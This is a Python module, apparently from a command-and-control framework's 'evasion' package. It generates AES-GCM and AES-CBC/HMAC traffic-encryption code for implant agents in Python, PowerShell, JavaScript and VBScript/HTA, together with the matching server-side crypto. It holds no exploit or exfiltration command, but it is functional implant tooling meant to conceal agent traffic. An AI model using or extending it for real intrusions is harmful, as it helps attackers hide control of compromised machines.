"""AES-256-GCM encryption code generation for all agent languages.

Generates language-specific encrypt/decrypt code that replaces the legacy XOR
functions.  The generated code uses the ``{{ENCRYPTION_KEY}}`` placeholder
which the agent generator fills in at build time.

Wire format (base64-encoded for text transport):
    nonce(12) || tag(16) || ciphertext

Key derivation:
    HKDF-SHA256
        IKM  = shared secret (the ``{{ENCRYPTION_KEY}}`` value)
        Salt = agent_id  (or b"sockpuppets-bootstrap" before registration)
        Info = b"sockpuppets-c2s" | b"sockpuppets-s2c"
"""

from __future__ import annotations

from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from evasion import EvasionConfig


# ---------------------------------------------------------------------------
# Public API required by evasion/__init__.py
# ---------------------------------------------------------------------------

def generate_code(lang: str, config: EvasionConfig) -> str:  # noqa: ARG001 – config reserved for future options
    """Return a complete source-code block implementing AES-256-GCM
    encrypt/decrypt for *lang*.

    The returned string is injected verbatim into the agent template,
    replacing the old XOR functions.
    """
    generators = {
        "python": _generate_python,
        "powershell": _generate_powershell,
        "javascript": _generate_javascript,
        "vbscript": _generate_vbscript,
    }
    gen = generators.get(lang)
    if gen is None:
        return ""
    return gen()


def generate_server_code() -> str:
    """Return Python code for the *server side* AES-256-GCM implementation.

    Includes ``encrypt``, ``decrypt``, ``derive_keys``, and
    ``derive_bootstrap_key`` functions using the ``cryptography`` library.
    """
    return _SERVER_CODE


# ---------------------------------------------------------------------------
# Python agent
# ---------------------------------------------------------------------------

def _generate_python() -> str:
    return '''\
import os as _os
import base64 as _b64
import hashlib as _hashlib
import hmac as _hmac

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
    from cryptography.hazmat.primitives import hashes
    _USE_CRYPTOGRAPHY = True
except ImportError:
    _USE_CRYPTOGRAPHY = False

_SHARED_SECRET = b'{{ENCRYPTION_KEY}}'
_BOOTSTRAP_SALT = b"sockpuppets-bootstrap"
_C2S_INFO = b"sockpuppets-c2s"
_S2C_INFO = b"sockpuppets-s2c"

# Session keys – populated by derive_session_keys()
_c2s_key = None
_s2c_key = None


def _hkdf_derive(ikm: bytes, salt: bytes, info: bytes, length: int = 32) -> bytes:
    if _USE_CRYPTOGRAPHY:
        return HKDF(
            algorithm=hashes.SHA256(),
            length=length,
            salt=salt,
            info=info,
        ).derive(ikm)
    # Pure-Python fallback using stdlib hmac/hashlib
    # HKDF extract
    if not salt:
        salt = b"\\x00" * 32
    prk = _hmac.new(salt, ikm, _hashlib.sha256).digest()
    # HKDF expand
    t = b""
    okm = b""
    for i in range(1, (length + 31) // 32 + 1):
        t = _hmac.new(prk, t + info + bytes([i]), _hashlib.sha256).digest()
        okm += t
    return okm[:length]


def derive_session_keys(shared_secret: bytes, agent_id: str) -> tuple:
    """Derive directional AES-256 keys from the shared secret and agent ID."""
    global _c2s_key, _s2c_key
    salt = agent_id.encode() if agent_id else _BOOTSTRAP_SALT
    _c2s_key = _hkdf_derive(shared_secret, salt, _C2S_INFO)
    _s2c_key = _hkdf_derive(shared_secret, salt, _S2C_INFO)
    return (_c2s_key, _s2c_key)


def _get_c2s_key() -> bytes:
    if _c2s_key is None:
        derive_session_keys(_SHARED_SECRET, "")
    return _c2s_key


def _get_s2c_key() -> bytes:
    if _s2c_key is None:
        derive_session_keys(_SHARED_SECRET, "")
    return _s2c_key


def _aes_gcm_encrypt(plaintext: bytes, key: bytes) -> bytes:
    nonce = _os.urandom(12)
    if _USE_CRYPTOGRAPHY:
        aesgcm = AESGCM(key)
        ct = aesgcm.encrypt(nonce, plaintext, None)
        # cryptography returns ciphertext || tag (tag is last 16 bytes)
        ciphertext = ct[:-16]
        tag = ct[-16:]
    else:
        # PyCryptodome fallback
        from Crypto.Cipher import AES
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    return nonce + tag + ciphertext


def _aes_gcm_decrypt(data: bytes, key: bytes) -> bytes:
    nonce = data[:12]
    tag = data[12:28]
    ciphertext = data[28:]
    if _USE_CRYPTOGRAPHY:
        aesgcm = AESGCM(key)
        combined = ciphertext + tag
        return aesgcm.decrypt(nonce, combined, None)
    else:
        from Crypto.Cipher import AES
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag)


def simple_encrypt(data: str) -> str:
    plaintext = data.encode("utf-8")
    raw = _aes_gcm_encrypt(plaintext, _get_c2s_key())
    return _b64.b64encode(raw).decode("ascii")


def simple_decrypt(data: str) -> str:
    raw = _b64.b64decode(data)
    plaintext = _aes_gcm_decrypt(raw, _get_s2c_key())
    return plaintext.decode("utf-8")
'''


# ---------------------------------------------------------------------------
# PowerShell agent
# ---------------------------------------------------------------------------

def _generate_powershell() -> str:
    return '''\
$script:SharedSecret = [System.Text.Encoding]::UTF8.GetBytes('{{ENCRYPTION_KEY}}')
$script:BootstrapSalt = [System.Text.Encoding]::UTF8.GetBytes('sockpuppets-bootstrap')
$script:C2SInfo = [System.Text.Encoding]::UTF8.GetBytes('sockpuppets-c2s')
$script:S2CInfo = [System.Text.Encoding]::UTF8.GetBytes('sockpuppets-s2c')
$script:C2SKey = $null
$script:S2CKey = $null

function Invoke-HKDF {
    param(
        [byte[]]$IKM,
        [byte[]]$Salt,
        [byte[]]$Info,
        [int]$Length = 32
    )
    if (-not $Salt -or $Salt.Length -eq 0) {
        $Salt = New-Object byte[] 32
    }
    # Extract
    $hmacExtract = New-Object System.Security.Cryptography.HMACSHA256
    $hmacExtract.Key = $Salt
    $prk = $hmacExtract.ComputeHash($IKM)
    $hmacExtract.Dispose()
    # Expand
    $n = [Math]::Ceiling($Length / 32.0)
    $okm = @()
    $t = @()
    for ($i = 1; $i -le $n; $i++) {
        $input = [byte[]]($t + $Info + @([byte]$i))
        $hmacExpand = New-Object System.Security.Cryptography.HMACSHA256
        $hmacExpand.Key = $prk
        $t = $hmacExpand.ComputeHash($input)
        $hmacExpand.Dispose()
        $okm += $t
    }
    return [byte[]]($okm[0..($Length - 1)])
}

function Invoke-DeriveSessionKeys {
    param([byte[]]$Secret, [string]$AgentId)
    if ($AgentId) {
        $salt = [System.Text.Encoding]::UTF8.GetBytes($AgentId)
    } else {
        $salt = $script:BootstrapSalt
    }
    $script:C2SKey = Invoke-HKDF -IKM $Secret -Salt $salt -Info $script:C2SInfo
    $script:S2CKey = Invoke-HKDF -IKM $Secret -Salt $salt -Info $script:S2CInfo
}

function Get-C2SKey {
    if (-not $script:C2SKey) {
        Invoke-DeriveSessionKeys -Secret $script:SharedSecret -AgentId ""
    }
    return $script:C2SKey
}

function Get-S2CKey {
    if (-not $script:S2CKey) {
        Invoke-DeriveSessionKeys -Secret $script:SharedSecret -AgentId ""
    }
    return $script:S2CKey
}

# Detect .NET AesGcm availability
$script:HasAesGcm = $false
try {
    $testType = [System.Security.Cryptography.AesGcm]
    $script:HasAesGcm = $true
} catch {}

function Invoke-AesGcmEncrypt {
    param([byte[]]$Plaintext, [byte[]]$Key)
    $nonce = New-Object byte[] 12
    [System.Security.Cryptography.RandomNumberGenerator]::Fill($nonce)

    if ($script:HasAesGcm) {
        $tag = New-Object byte[] 16
        $ciphertext = New-Object byte[] $Plaintext.Length
        $aes = [System.Security.Cryptography.AesGcm]::new($Key)
        $aes.Encrypt($nonce, $Plaintext, $ciphertext, $tag)
        $aes.Dispose()
    } else {
        # CBC + HMAC-SHA256 fallback (Encrypt-then-MAC)
        $aesAlg = [System.Security.Cryptography.Aes]::Create()
        $aesAlg.Key = $Key
        $aesAlg.IV = New-Object byte[] 16
        # Use nonce as first 12 bytes of IV, zero-pad to 16
        [Array]::Copy($nonce, 0, $aesAlg.IV, 0, 12)
        $aesAlg.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesAlg.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $encryptor = $aesAlg.CreateEncryptor()
        $ciphertext = $encryptor.TransformFinalBlock($Plaintext, 0, $Plaintext.Length)
        $encryptor.Dispose()
        $aesAlg.Dispose()
        # HMAC tag over nonce + ciphertext
        $hmac = New-Object System.Security.Cryptography.HMACSHA256
        $hmac.Key = $Key
        $macInput = New-Object byte[] ($nonce.Length + $ciphertext.Length)
        [Array]::Copy($nonce, 0, $macInput, 0, $nonce.Length)
        [Array]::Copy($ciphertext, 0, $macInput, $nonce.Length, $ciphertext.Length)
        $fullTag = $hmac.ComputeHash($macInput)
        $hmac.Dispose()
        $tag = $fullTag[0..15]
    }
    # Wire: nonce(12) + tag(16) + ciphertext
    $result = New-Object byte[] ($nonce.Length + $tag.Length + $ciphertext.Length)
    [Array]::Copy($nonce, 0, $result, 0, 12)
    [Array]::Copy($tag, 0, $result, 12, 16)
    [Array]::Copy($ciphertext, 0, $result, 28, $ciphertext.Length)
    return $result
}

function Invoke-AesGcmDecrypt {
    param([byte[]]$Data, [byte[]]$Key)
    $nonce = $Data[0..11]
    $tag = $Data[12..27]
    $ciphertext = $Data[28..($Data.Length - 1)]

    if ($script:HasAesGcm) {
        $plaintext = New-Object byte[] $ciphertext.Length
        $aes = [System.Security.Cryptography.AesGcm]::new($Key)
        $aes.Decrypt($nonce, $ciphertext, [byte[]]$tag, $plaintext)
        $aes.Dispose()
    } else {
        # Verify HMAC first (Encrypt-then-MAC)
        $hmac = New-Object System.Security.Cryptography.HMACSHA256
        $hmac.Key = $Key
        $macInput = New-Object byte[] ($nonce.Length + $ciphertext.Length)
        [Array]::Copy($nonce, 0, $macInput, 0, $nonce.Length)
        [Array]::Copy($ciphertext, 0, $macInput, $nonce.Length, $ciphertext.Length)
        $computedTag = $hmac.ComputeHash($macInput)
        $hmac.Dispose()
        $expectedTag = $computedTag[0..15]
        $mismatch = $false
        for ($i = 0; $i -lt 16; $i++) {
            if ($tag[$i] -ne $expectedTag[$i]) { $mismatch = $true }
        }
        if ($mismatch) { throw "Authentication tag verification failed" }
        # Decrypt CBC
        $aesAlg = [System.Security.Cryptography.Aes]::Create()
        $aesAlg.Key = $Key
        $aesAlg.IV = New-Object byte[] 16
        [Array]::Copy($nonce, 0, $aesAlg.IV, 0, 12)
        $aesAlg.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesAlg.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $decryptor = $aesAlg.CreateDecryptor()
        $plaintext = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
        $decryptor.Dispose()
        $aesAlg.Dispose()
    }
    return $plaintext
}

function Invoke-XOREncryption {
    param([string]$Data)
    $key = Get-C2SKey
    $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
    $encrypted = Invoke-AesGcmEncrypt -Plaintext $dataBytes -Key $key
    return [Convert]::ToBase64String($encrypted)
}

function Invoke-XORDecryption {
    param([string]$Data)
    $key = Get-S2CKey
    $dataBytes = [Convert]::FromBase64String($Data)
    $decrypted = Invoke-AesGcmDecrypt -Data $dataBytes -Key $key
    return [System.Text.Encoding]::UTF8.GetString($decrypted)
}

function derive_session_keys {
    param([byte[]]$SharedSecret, [string]$AgentId)
    Invoke-DeriveSessionKeys -Secret $SharedSecret -AgentId $AgentId
    return @($script:C2SKey, $script:S2CKey)
}
'''


# ---------------------------------------------------------------------------
# JavaScript (Node.js) agent
# ---------------------------------------------------------------------------

def _generate_javascript() -> str:
    return """\
const crypto = require('crypto');

const SHARED_SECRET = Buffer.from('{{ENCRYPTION_KEY}}');
const BOOTSTRAP_SALT = Buffer.from('sockpuppets-bootstrap');
const C2S_INFO = Buffer.from('sockpuppets-c2s');
const S2C_INFO = Buffer.from('sockpuppets-s2c');

let c2sKey = null;
let s2cKey = null;

function hkdfDerive(ikm, salt, info, length = 32) {
    if (!salt || salt.length === 0) {
        salt = Buffer.alloc(32);
    }
    // Extract
    const prk = crypto.createHmac('sha256', salt).update(ikm).digest();
    // Expand
    const n = Math.ceil(length / 32);
    let t = Buffer.alloc(0);
    let okm = Buffer.alloc(0);
    for (let i = 1; i <= n; i++) {
        const input = Buffer.concat([t, info, Buffer.from([i])]);
        t = crypto.createHmac('sha256', prk).update(input).digest();
        okm = Buffer.concat([okm, t]);
    }
    return okm.slice(0, length);
}

function derive_session_keys(sharedSecret, agentId) {
    const salt = agentId ? Buffer.from(agentId) : BOOTSTRAP_SALT;
    c2sKey = hkdfDerive(sharedSecret, salt, C2S_INFO);
    s2cKey = hkdfDerive(sharedSecret, salt, S2C_INFO);
    return [c2sKey, s2cKey];
}

function getC2SKey() {
    if (!c2sKey) derive_session_keys(SHARED_SECRET, '');
    return c2sKey;
}

function getS2CKey() {
    if (!s2cKey) derive_session_keys(SHARED_SECRET, '');
    return s2cKey;
}

function simpleEncrypt(data) {
    const key = getC2SKey();
    const nonce = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv('aes-256-gcm', key, nonce);
    const plaintext = Buffer.from(data, 'utf8');
    const ciphertext = Buffer.concat([cipher.update(plaintext), cipher.final()]);
    const tag = cipher.getAuthTag();
    // Wire: nonce(12) + tag(16) + ciphertext
    const wire = Buffer.concat([nonce, tag, ciphertext]);
    return wire.toString('base64');
}

function simpleDecrypt(data) {
    const key = getS2CKey();
    const raw = Buffer.from(data, 'base64');
    const nonce = raw.slice(0, 12);
    const tag = raw.slice(12, 28);
    const ciphertext = raw.slice(28);
    const decipher = crypto.createDecipheriv('aes-256-gcm', key, nonce);
    decipher.setAuthTag(tag);
    const plaintext = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
    return plaintext.toString('utf8');
}
"""


# ---------------------------------------------------------------------------
# VBScript / HTA agent (AES-CBC + HMAC-SHA256, Encrypt-then-MAC)
# ---------------------------------------------------------------------------

def _generate_vbscript() -> str:
    return """\
        Dim gSharedSecret, gBootstrapSalt, gC2SInfo, gS2CInfo
        Dim gC2SKey, gS2CKey
        gSharedSecret = "{{ENCRYPTION_KEY}}"
        gBootstrapSalt = "sockpuppets-bootstrap"
        gC2SInfo = "sockpuppets-c2s"
        gS2CInfo = "sockpuppets-s2c"
        gC2SKey = ""
        gS2CKey = ""

        Function HKDFDerive(ikm, salt, info, length)
            ' HKDF-SHA256 Extract then Expand via .NET COM
            Dim hmacObj, prkBytes, t, okm, i, inputBytes

            If salt = "" Then salt = String(32, Chr(0))

            ' Extract: PRK = HMAC-SHA256(salt, ikm)
            Set hmacObj = CreateObject("System.Security.Cryptography.HMACSHA256")
            hmacObj.Key = Stream_StringToBinary(salt)
            prkBytes = hmacObj.ComputeHash_2(Stream_StringToBinary(ikm))

            ' Expand
            t = ""
            okm = ""
            Dim n
            n = Int((length + 31) / 32)
            For i = 1 To n
                Set hmacObj = CreateObject("System.Security.Cryptography.HMACSHA256")
                hmacObj.Key = prkBytes
                inputBytes = Stream_StringToBinary(t & info & Chr(i))
                Dim hashResult
                hashResult = hmacObj.ComputeHash_2(inputBytes)
                t = Stream_BinaryToString(hashResult)
                okm = okm & t
            Next
            HKDFDerive = Left(okm, length)
        End Function

        Sub derive_session_keys(sharedSecret, agentId)
            Dim salt
            If agentId <> "" Then
                salt = agentId
            Else
                salt = gBootstrapSalt
            End If
            gC2SKey = HKDFDerive(sharedSecret, salt, gC2SInfo, 32)
            gS2CKey = HKDFDerive(sharedSecret, salt, gS2CInfo, 32)
        End Sub

        Function GetC2SKey()
            If gC2SKey = "" Then derive_session_keys gSharedSecret, ""
            GetC2SKey = gC2SKey
        End Function

        Function GetS2CKey()
            If gS2CKey = "" Then derive_session_keys gSharedSecret, ""
            GetS2CKey = gS2CKey
        End Function

        Function GenerateRandomBytes(n)
            Dim objCSP, bytes
            Set objCSP = CreateObject("System.Security.Cryptography.RNGCryptoServiceProvider")
            Dim arr
            ReDim arr(n - 1)
            Dim byteArr
            byteArr = Stream_StringToBinary(String(n, Chr(0)))
            objCSP.GetBytes byteArr
            GenerateRandomBytes = byteArr
        End Function

        Function AesCbcEncrypt(plaintext, key, ivBytes)
            Dim aes, encryptor, ptBytes, ctBytes
            Set aes = CreateObject("System.Security.Cryptography.AesCryptoServiceProvider")
            aes.Key = Stream_StringToBinary(key)
            aes.IV = ivBytes
            aes.Mode = 1  ' CBC
            aes.Padding = 2  ' PKCS7
            Set encryptor = aes.CreateEncryptor()
            ptBytes = Stream_StringToBinary(plaintext)
            ctBytes = encryptor.TransformFinalBlock(ptBytes, 0, LenB(ptBytes))
            AesCbcEncrypt = ctBytes
        End Function

        Function AesCbcDecrypt(cipherBytes, key, ivBytes)
            Dim aes, decryptor, ptBytes
            Set aes = CreateObject("System.Security.Cryptography.AesCryptoServiceProvider")
            aes.Key = Stream_StringToBinary(key)
            aes.IV = ivBytes
            aes.Mode = 1  ' CBC
            aes.Padding = 2  ' PKCS7
            Set decryptor = aes.CreateDecryptor()
            ptBytes = decryptor.TransformFinalBlock(cipherBytes, 0, LenB(cipherBytes))
            AesCbcDecrypt = ptBytes
        End Function

        Function ComputeHMAC(key, data)
            Dim hmacObj
            Set hmacObj = CreateObject("System.Security.Cryptography.HMACSHA256")
            hmacObj.Key = Stream_StringToBinary(key)
            Dim fullTag
            fullTag = hmacObj.ComputeHash_2(data)
            ' Return first 16 bytes as tag
            ComputeHMAC = LeftB(fullTag, 16)
        End Function

        Function XOREncrypt(data)
            ' AES-CBC + HMAC-SHA256 Encrypt-then-MAC
            Dim key, nonce, iv, ciphertext, macInput, tag, result
            key = GetC2SKey()

            ' Generate 12-byte nonce
            nonce = GenerateRandomBytes(12)

            ' Build 16-byte IV: nonce + 4 zero bytes
            Dim ivStr
            ivStr = Stream_BinaryToString(nonce) & String(4, Chr(0))
            iv = Stream_StringToBinary(ivStr)

            ' Encrypt
            ciphertext = AesCbcEncrypt(data, key, iv)

            ' HMAC over nonce + ciphertext
            Dim macStr
            macStr = Stream_BinaryToString(nonce) & Stream_BinaryToString(ciphertext)
            tag = ComputeHMAC(key, Stream_StringToBinary(macStr))

            ' Wire: nonce(12) + tag(16) + ciphertext
            Dim wireStr
            wireStr = Stream_BinaryToString(nonce) & Stream_BinaryToString(tag) & Stream_BinaryToString(ciphertext)
            XOREncrypt = Base64Encode(wireStr)
        End Function

        Function XORDecrypt(data)
            ' AES-CBC + HMAC-SHA256 Decrypt with MAC verification
            Dim key, decoded, nonce, tag, ciphertext
            key = GetS2CKey()
            decoded = Base64Decode(data)

            ' Parse wire format
            nonce = Stream_StringToBinary(Left(decoded, 12))
            tag = Mid(decoded, 13, 16)
            ciphertext = Stream_StringToBinary(Mid(decoded, 29))

            ' Verify HMAC
            Dim macStr, expectedTag
            macStr = Left(decoded, 12) & Mid(decoded, 29)
            expectedTag = ComputeHMAC(key, Stream_StringToBinary(macStr))
            If Stream_BinaryToString(expectedTag) <> tag Then
                Err.Raise 5, "XORDecrypt", "Authentication tag verification failed"
            End If

            ' Decrypt
            Dim ivStr, iv
            ivStr = Stream_BinaryToString(nonce) & String(4, Chr(0))
            iv = Stream_StringToBinary(ivStr)
            Dim ptBytes
            ptBytes = AesCbcDecrypt(ciphertext, key, iv)
            XORDecrypt = Stream_BinaryToString(ptBytes)
        End Function

        Function Base64Encode(sText)
            Dim oXML, oNode
            Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
            Set oNode = oXML.CreateElement("base64")
            oNode.dataType = "bin.base64"
            oNode.nodeTypedValue = Stream_StringToBinary(sText)
            Base64Encode = Replace(oNode.text, vbLf, "")
            Set oNode = Nothing
            Set oXML = Nothing
        End Function

        Function Base64Decode(sBase64)
            Dim oXML, oNode
            Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
            Set oNode = oXML.CreateElement("base64")
            oNode.dataType = "bin.base64"
            oNode.text = sBase64
            Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
            Set oNode = Nothing
            Set oXML = Nothing
        End Function

        Function Stream_StringToBinary(Text)
            Const adTypeText = 2
            Const adTypeBinary = 1
            Dim BinaryStream
            Set BinaryStream = CreateObject("ADODB.Stream")
            BinaryStream.Type = adTypeText
            BinaryStream.CharSet = "us-ascii"
            BinaryStream.Open
            BinaryStream.WriteText Text
            BinaryStream.Position = 0
            BinaryStream.Type = adTypeBinary
            Stream_StringToBinary = BinaryStream.Read
            BinaryStream.Close
            Set BinaryStream = Nothing
        End Function

        Function Stream_BinaryToString(Binary)
            Const adTypeText = 2
            Const adTypeBinary = 1
            Dim BinaryStream
            Set BinaryStream = CreateObject("ADODB.Stream")
            BinaryStream.Type = adTypeBinary
            BinaryStream.Open
            BinaryStream.Write Binary
            BinaryStream.Position = 0
            BinaryStream.Type = adTypeText
            BinaryStream.CharSet = "us-ascii"
            Stream_BinaryToString = BinaryStream.ReadText
            BinaryStream.Close
            Set BinaryStream = Nothing
        End Function
"""


# ---------------------------------------------------------------------------
# Server-side Python implementation
# ---------------------------------------------------------------------------

_SERVER_CODE = '''\
"""Server-side AES-256-GCM encryption module.

Usage:
    from evasion.crypto import ServerCrypto

    sc = ServerCrypto(shared_secret=b"my-key")
    sc.derive_keys(agent_id="abc123")
    encrypted = sc.encrypt(b"hello", direction="s2c")
    plaintext = sc.decrypt(encrypted, direction="c2s")
"""

import os
import base64

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes

BOOTSTRAP_SALT = b"sockpuppets-bootstrap"
C2S_INFO = b"sockpuppets-c2s"
S2C_INFO = b"sockpuppets-s2c"


def _hkdf(ikm: bytes, salt: bytes, info: bytes, length: int = 32) -> bytes:
    return HKDF(
        algorithm=hashes.SHA256(),
        length=length,
        salt=salt,
        info=info,
    ).derive(ikm)


def derive_keys(shared_secret: bytes, agent_id: str) -> tuple[bytes, bytes]:
    """Return (c2s_key, s2c_key) for *agent_id*."""
    salt = agent_id.encode() if agent_id else BOOTSTRAP_SALT
    c2s = _hkdf(shared_secret, salt, C2S_INFO)
    s2c = _hkdf(shared_secret, salt, S2C_INFO)
    return (c2s, s2c)


def derive_bootstrap_key(shared_secret: bytes, direction: str = "c2s") -> bytes:
    """Derive the pre-registration bootstrap key."""
    info = C2S_INFO if direction == "c2s" else S2C_INFO
    return _hkdf(shared_secret, BOOTSTRAP_SALT, info)


def encrypt(plaintext: bytes, key: bytes) -> bytes:
    """AES-256-GCM encrypt.  Returns nonce(12) + tag(16) + ciphertext."""
    nonce = os.urandom(12)
    aesgcm = AESGCM(key)
    ct_with_tag = aesgcm.encrypt(nonce, plaintext, None)
    ciphertext = ct_with_tag[:-16]
    tag = ct_with_tag[-16:]
    return nonce + tag + ciphertext


def decrypt(data: bytes, key: bytes) -> bytes:
    """AES-256-GCM decrypt from wire format nonce(12) + tag(16) + ciphertext."""
    nonce = data[:12]
    tag = data[12:28]
    ciphertext = data[28:]
    aesgcm = AESGCM(key)
    return aesgcm.decrypt(nonce, ciphertext + tag, None)


def encrypt_b64(plaintext: str, key: bytes) -> str:
    """Encrypt a UTF-8 string, return base64."""
    raw = encrypt(plaintext.encode("utf-8"), key)
    return base64.b64encode(raw).decode("ascii")


def decrypt_b64(data: str, key: bytes) -> str:
    """Decrypt a base64 string, return UTF-8."""
    raw = base64.b64decode(data)
    return decrypt(raw, key).decode("utf-8")


class ServerCrypto:
    """Convenience wrapper managing per-agent key state."""

    def __init__(self, shared_secret: bytes):
        self.shared_secret = shared_secret
        self._c2s_key: bytes | None = None
        self._s2c_key: bytes | None = None

    def derive_keys(self, agent_id: str) -> tuple[bytes, bytes]:
        self._c2s_key, self._s2c_key = derive_keys(self.shared_secret, agent_id)
        return (self._c2s_key, self._s2c_key)

    def derive_bootstrap(self) -> tuple[bytes, bytes]:
        c2s = derive_bootstrap_key(self.shared_secret, "c2s")
        s2c = derive_bootstrap_key(self.shared_secret, "s2c")
        self._c2s_key = c2s
        self._s2c_key = s2c
        return (c2s, s2c)

    def encrypt(self, data: bytes, direction: str = "s2c") -> bytes:
        key = self._s2c_key if direction == "s2c" else self._c2s_key
        if key is None:
            raise RuntimeError("Keys not derived yet; call derive_keys() or derive_bootstrap()")
        return encrypt(data, key)

    def decrypt(self, data: bytes, direction: str = "c2s") -> bytes:
        key = self._c2s_key if direction == "c2s" else self._s2c_key
        if key is None:
            raise RuntimeError("Keys not derived yet; call derive_keys() or derive_bootstrap()")
        return decrypt(data, key)

    def simple_encrypt(self, data: str) -> str:
        """Drop-in replacement for the old XOR simple_encrypt."""
        key = self._s2c_key
        if key is None:
            raise RuntimeError("Keys not derived yet")
        return encrypt_b64(data, key)

    def simple_decrypt(self, data: str) -> str:
        """Drop-in replacement for the old XOR simple_decrypt."""
        key = self._c2s_key
        if key is None:
            raise RuntimeError("Keys not derived yet")
        return decrypt_b64(data, key)
'''
